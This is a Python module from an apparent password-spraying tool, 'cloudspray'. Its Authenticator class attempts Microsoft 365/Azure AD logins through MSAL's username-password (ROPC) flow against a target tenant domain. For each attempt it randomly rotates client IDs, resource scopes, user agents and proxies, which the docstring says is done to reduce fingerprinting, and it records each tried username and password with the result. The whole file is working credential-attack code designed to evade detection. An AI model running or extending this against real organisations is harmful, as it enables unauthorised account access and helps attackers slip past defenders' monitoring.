import random
from datetime import datetime, timezone

import msal
import requests

from cloudspray.constants import ALL_CLIENT_IDS, ENDPOINTS, USER_AGENTS
from cloudspray.spray.classifier import classify_auth_result
from cloudspray.state.models import SprayAttempt


class Authenticator:
    """Wraps MSAL ROPC flow with client ID, endpoint, and user-agent rotation."""

    def __init__(self, domain: str, proxy_session: requests.Session | None = None):
        """
        Args:
            domain: Target tenant domain (e.g., contoso.com).
            proxy_session: Optional pre-configured session from proxy manager.
        """
        self._domain = domain
        self._authority = f"https://login.microsoftonline.com/{domain}"
        self._proxy_session = proxy_session
        self._client_ids = list(ALL_CLIENT_IDS.values())
        self._endpoints = list(ENDPOINTS.values())

    def attempt(self, username: str, password: str) -> SprayAttempt:
        """Perform a single ROPC authentication attempt.

        Randomly selects a client_id, endpoint scope, and user-agent string for
        each attempt to reduce fingerprinting.

        Returns:
            A fully populated SprayAttempt dataclass.
        """
        client_id = random.choice(self._client_ids)
        scope_resource = random.choice(self._endpoints)
        user_agent = random.choice(USER_AGENTS)

        # Replace {tenant} placeholder in SharePoint-style endpoints
        tenant_slug = self._domain.split(".")[0]
        scope_resource = scope_resource.replace("{tenant}", tenant_slug)
        scope = [f"{scope_resource}/.default"]

        proxy_url = ""
        http_client = self._proxy_session
        if http_client is None:
            http_client = requests.Session()
        else:
            # Track which proxy we used for logging
            proxy_url = (http_client.proxies or {}).get("https", "")

        http_client.headers["User-Agent"] = user_agent

        app = msal.PublicClientApplication(
            client_id,
            authority=self._authority,
            http_client=http_client,
        )

        auth_result = None
        auth_error = None
        try:
            auth_result = app.acquire_token_by_username_password(
                username, password, scopes=scope
            )
        except Exception as exc:
            auth_error = exc

        result_enum, error_code = classify_auth_result(auth_result, auth_error)

        return SprayAttempt(
            username=username,
            password=password,
            client_id=client_id,
            endpoint=scope_resource,
            user_agent=user_agent,
            result=result_enum,
            error_code=error_code,
            timestamp=datetime.now(timezone.utc),
            proxy_used=proxy_url,
        )
